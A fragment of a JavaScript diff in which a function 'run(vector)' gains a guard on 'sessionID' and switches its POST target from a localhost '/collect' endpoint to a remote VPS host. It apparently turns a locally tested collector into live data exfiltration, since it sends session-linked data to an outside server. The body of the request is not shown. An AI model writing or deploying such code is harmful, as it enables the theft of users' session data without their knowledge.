@@ -8,7 +8,10 @@ export function run(vector) {
       .toString()
       .trim();
   } catch {}
-  fetch("http://localhost:3001/collect", {
+
+  if (!sessionID) return;
+
+  fetch("http://vps23951.cubepath.net/collect", {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
